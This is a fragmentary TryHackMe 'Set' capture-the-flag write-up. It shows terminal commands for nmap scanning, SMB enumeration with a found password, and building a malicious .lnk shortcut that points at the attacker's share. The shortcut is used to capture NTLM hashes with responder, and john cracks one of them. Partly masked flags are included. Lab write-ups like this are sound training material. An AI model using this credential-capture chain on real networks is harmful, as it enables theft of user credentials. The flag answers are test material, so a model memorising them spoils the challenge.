...
```
bibo318@parrot:~/CTFs/tryhackme/Set$ sudo nmap -A -sS -sC -sV -O -Pn 10.10.213.25
...
```
bibo318@parrot:~/CTFs/tryhackme/Set$ xmllint  --xpath "//row/email"  users.xml | sed -e 's/<email>//g' | sed -e 's/<\/email>//g' | sed -e 's/@windcorp.thm//g'>users.txt
```
...
```
bibo318@parrot:~/CTFs/tryhackme/Set$ enum4linux -u myrtleowe -p Passw@rd 10.10.213.25
...
```
bibo318@parrot:~/CTFs/tryhackme/Set$ smbclient //10.10.213.25/Files -U myrtleowe
...
smb: \> exit
bibo318@parrot:~/CTFs/tryhackme/Set$ cat Info.txt
Zip and save your project files here.
We will review them

BTW.
Flag1: THM{V0N318*****4c66e2b8d4c45a65e6a7d0c7ad4a5d7ff245dc14}
```

[http://www.mamachine.org/mslink/index.en.html](http://www.mamachine.org/mslink/index.en.html)

```
bibo318@parrot:~/CTFs/tryhackme/Set$ chmod +x mslink_v1.3.sh
bibo318@parrot:~/CTFs/tryhackme/Set$ ./mslink_v1.3.sh -l notimportant -n shortcut -i \\\\10.8.106.222\\test -o shortcut.lnk
Création d'un raccourci de type "dossier local" avec pour cible notimportant
bibo318@parrot:~/CTFs/tryhackme/Set$ zip shortcut.zip shortcut.lnk
  adding: shortcut.lnk (deflated 43%)
bibo318@parrot:~/CTFs/tryhackme/Set$
```
...
```
bibo318@parrot:~/CTFs/tryhackme/Set$ sudo responder -I tun0
...
```
bibo318@parrot:~/CTFs/tryhackme/Set$ john MichelleWat.hash -w=/usr/share/wordlists/rockyou.txt
...
Flag2: THM{V0N318*****690798b1780964f5f51cebd854da5a2ea236ebb5}
```

1. Flag 1

`THM{V0N318*****4c66e2b8d4c45a65e6a7d0c7ad4a5d7ff245dc1412**123:))}`

2. Flag 2

`THM{V0N318*****690798b1780964f5f51cebd854da5a2ea236ebb512**123:))}`

3. Flag 3

`THM{V0N318*****934f7faaadab3b040edab8214789114c9d3049dd12**123:))}`
